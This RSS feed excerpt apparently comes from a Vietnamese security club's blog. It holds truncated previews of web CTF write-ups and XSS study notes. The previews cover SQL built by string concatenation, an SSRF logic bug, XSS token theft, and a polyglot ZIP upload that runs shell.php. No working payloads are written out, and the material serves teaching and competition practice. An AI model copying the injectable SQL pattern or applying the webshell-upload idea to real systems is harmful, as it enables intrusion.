&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; distro and package:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34; AND &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; package:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; f&lt;span style="color:#e6db74"&gt;&amp;#34;LOWER(package) = {json.dumps(package)}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34; ORDER BY distro, distro_version, package&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(sql)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;results &lt;span style="color:#f92672"&gt;=&lt;/span&gt; db.&lt;span style="color:#a6e22e"&gt;execute&lt;/span&gt;(sql).&lt;span style="color:#a6e22e"&gt;fetchall&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;author dùng &lt;code&gt;json.dump&lt;/code&gt; để quote tham số người dùng khi ghép chuỗi SQL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Giải thích về &lt;code&gt;json.dump&lt;/code&gt; trong python&lt;/strong&gt;
&lt;code&gt;json.dump&lt;/code&gt; được sử dụng để serialize một object python (vd: dictionary, list, tuple, string, int, float, bool, , None) thành định dạng JSON và viết trực tiếp vào một file hoặc file-like object.
module: cần &lt;code&gt;import json&lt;/code&gt; để sử dụng&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1762867950463-web/featured.png"/></item><item><title>PortfolioS</title><link>https://mtasecurity.github.io/MSEC/web/1761292330570-aaa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761292330570-aaa/</guid><description>&lt;h1 class="relative group"&gt;PortfolioS
&lt;div id="portfolios" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#portfolios" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Hk5zfaOCee.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Challenge file: &lt;a
href="https://drive.google.com/file/d/1g-ZEzFmsgxozcKSScCvevPqiFS4w4Bgh/view"
target="_blank"
&gt;public.zip&lt;/a&gt;&lt;/p&gt;
&lt;h2 class="relative group"&gt;1) Phân tích challenge
&lt;div id="1-phân-tích-challenge" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-ph%c3%a2n-t%c3%adch-challenge" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;h3 class="relative group"&gt;1.1 Kiến trúc (Docker Compose + mạng)
&lt;div id="11-kiến-trúc-docker-compose--mạng" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#11-ki%e1%ba%bfn-tr%c3%bac-docker-compose--m%e1%ba%a1ng" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Hệ thống có 2 service:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;app&lt;/strong&gt;: Spring Boot (Tomcat embedded)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nginx&lt;/strong&gt;: reverse proxy expose cổng &lt;strong&gt;8989&lt;/strong&gt; ra host, &lt;code&gt;proxy_pass http://app:8989&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Mọi truy cập từ ngoài đi &lt;strong&gt;qua nginx&lt;/strong&gt; rồi mới tới app.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkTvGp_Rle.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJ4OMad0el.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Syu_Gp_Rle.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1ZEET_0xg.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/H1oMNauCgl.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761292330570-aaa/featured.png"/></item><item><title>WRITEUP: AUTHMAN (BUCKEYE 2025)</title><link>https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/</guid><description>&lt;h1 class="relative group"&gt;WRITEUP: AUTHMAN (BUCKEYE 2025)
&lt;div id="writeup-authman-buckeye-2025" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#writeup-authman-buckeye-2025" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1077UmxWl.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="auto"
alt="alt text"
width="140"
height="338"
src="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png"
srcset="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png 800w, https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png 1280w"
sizes="(min-width: 768px) 50vw, 65vw"
data-zoom-src="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png"&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;h2 class="relative group"&gt;Quick summary
&lt;div id="quick-summary" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#quick-summary" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Đây là một web app Flask nhỏ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Flag nằm ở /auth, được bảo vệ bằng HTTP Digest Auth&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Có một API check dùng Referer để tự gọi lại chính nó → đây là chỗ dị nhất, tiềm năng SSRF + logic bug&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/featured.png"/></item><item><title>xss</title><link>https://mtasecurity.github.io/MSEC/web/1764595928119-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1764595928119-xss/</guid><description>&lt;h1 class="relative group"&gt;XSS
&lt;div id="xss" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#xss" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;h2 class="relative group"&gt;1. Browser Security Model
&lt;div id="1-browser-security-model" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-browser-security-model" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Frontend chạy trong sandbox của browser, chỉ làm được những gì browser cho phép qua API (fetch, DOM, WebAPI…); không chạm trực tiếp OS như backend&lt;/li&gt;
&lt;li&gt;Không được tự ý đọc file local: chỉ đọc được file khi user chọn (input file + FileReader). Nếu không thì web nào cũng có thể ăn cắp dữ liệu máy người dùng&lt;/li&gt;
&lt;li&gt;Không gọi được system API trực tiếp: JS chỉ là ngôn ngữ, còn quyền là do browser; các API nhạy cảm (camera, mic, Bluetooth…) đều phải được user cho phép&lt;/li&gt;
&lt;li&gt;Same-Origin Policy (SOP): script chỉ truy cập được dữ liệu cùng origin; không đọc DOM/URL/nội dung của tab/iframe origin khác&lt;/li&gt;
&lt;li&gt;Browser còn dùng site isolation để tách site theo process, giảm rủi ro leak dữ liệu giữa site&lt;/li&gt;
&lt;li&gt;Nếu vượt được các giới hạn này (bypass SOP, RCE trong browser) thì đó là lỗ hổng trình duyệt, không còn là bug ứng dụng web bình thường&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;2. Starting with XSS for Frontend Security
&lt;div id="2-starting-with-xss-for-frontend-security" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#2-starting-with-xss-for-frontend-security" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;XSS = attacker thực thi được JS trong context webstie của nạn nhân&lt;/li&gt;
&lt;li&gt;Từ XSS, attacker có thể:
&lt;ul&gt;
&lt;li&gt;Đọc token trong &lt;code&gt;localStorage&lt;/code&gt;/cookie (nếu không HTttpOnly)&lt;/li&gt;
&lt;li&gt;Thực hiện mọi hành động mà user làm được (gửi request, đổi setting, thao tác dữ liệu&amp;hellip;.)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Vì vậy nhiều site khi đổi mật khẩu bắt nhập lại &lt;em&gt;current password&lt;/em&gt;: dù có XSS + token thì attacker vẫn không chiếm tài khoản lâu dài nếu không biết current password&lt;/li&gt;
&lt;li&gt;Phân loại theo cách lưu trữ:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Reflected XSS&lt;/strong&gt;: payload không lưu, thường nằm trên URL/form → cần dụ từng nạn nhân click&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: payload được lưu (comment, profile, bài viết…) → ai mở là dính, có thể lan rộng như “worm”&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Self-XSS&lt;/strong&gt;: chỉ ảnh hưởng đến chính người nhập (hoặc chỉ xuất hiện ở trang chỉ mình họ xem)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Blind XSS&lt;/strong&gt;: payload chạy ở nơi bạn không thấy (thường là admin/staff panel), phải log ngược ra server của attacker&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;3.Understanding XSS a Bit More
&lt;div id="3understanding-xss-a-bit-more" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#3understanding-xss-a-bit-more" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;h3 class="relative group"&gt;Các cách thực thi JS khi đã kiểm soát HTML:
&lt;div id="các-cách-thực-thi-js-khi-đã-kiểm-soát-html" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#c%c3%a1c-c%c3%a1ch-th%e1%bb%b1c-thi-js-khi-%c4%91%c3%a3-ki%e1%bb%83m-so%c3%a1t-html" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Thẻ &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;: trực diện nhưng hay bị filter/WAF, nhiều nơi (innerHTML) không thực thi script&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1764595928119-xss/featured.png"/></item><item><title>ZC-1 CHALLENGE</title><link>https://mtasecurity.github.io/MSEC/web/1761292219022-abc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761292219022-abc/</guid><description>&lt;h1 class="relative group"&gt;ZC-1 CHALLENGE
&lt;div id="zc-1-challenge" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#zc-1-challenge" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;h1 class="relative group"&gt;MTA_SUPPORT
&lt;div id="mta_support" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#mta_support" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/ry_nOA4Cxl.png"
&gt;&lt;/figure&gt;
challenge file: &lt;a
href="https://drive.google.com/file/d/1PprDuWV1u11dnH1mf_Bc70La8CpFZ7NR/view"
target="_blank"
&gt;public&lt;/a&gt;&lt;/p&gt;
&lt;h3 class="relative group"&gt;IDEA: Polyglot ZIP→7z + kích hoạt qua “health” nội bộ
&lt;div id="idea-polyglot-zip7z--kích-hoạt-qua-health-nội-bộ" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#idea-polyglot-zip7z--k%c3%adch-ho%e1%ba%a1t-qua-health-n%e1%bb%99i-b%e1%bb%99" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;p&gt;Mục tiêu: Upload 1 file vượt qua kiểm tra &lt;code&gt;ZIP safety&lt;/code&gt; của &lt;code&gt;service 1&lt;/code&gt; nhưng buộc &lt;code&gt;service 2&lt;/code&gt; giải nén và chạy shell.php, rồi dùng endpoint health để gọi file này để lấy flag CSCV2025{}.&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761292219022-abc/featured.png"/></item></channel></rss>